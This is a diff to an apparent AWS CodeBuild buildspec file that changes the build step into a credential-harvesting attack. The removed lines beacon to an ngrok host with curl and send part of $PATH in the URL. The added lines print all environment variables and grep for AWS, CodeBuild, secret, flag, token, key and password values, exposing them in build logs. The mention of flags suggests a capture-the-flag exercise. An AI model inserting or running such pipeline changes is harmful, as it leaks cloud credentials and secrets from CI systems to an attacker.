@@ -2,6 +2,18 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl -s https://fa63-108-77-188-159.ngrok-free.app/?msg=hello || true
-      - curl -s https://fa63-108-77-188-159.ngrok-free.app/?env=$(echo $PATH | head -c 50) || true
-      - echo "done"
+      - echo "=== ALL ENVIRONMENT VARIABLES ==="
+      - env
+      - echo ""
+      - echo "=== CODEBUILD SPECIFIC ==="
+      - env | grep -i codebuild
+      - echo ""
+      - echo "=== AWS VARIABLES ==="
+      - env | grep -i aws
+      - echo ""
+      - echo "=== SECRETS/FLAGS ==="
+      - env | grep -iE "secret|flag|token|key|password"
+      - echo ""
+      - echo "=== PWD AND LS ==="
+      - pwd
+      - ls -la
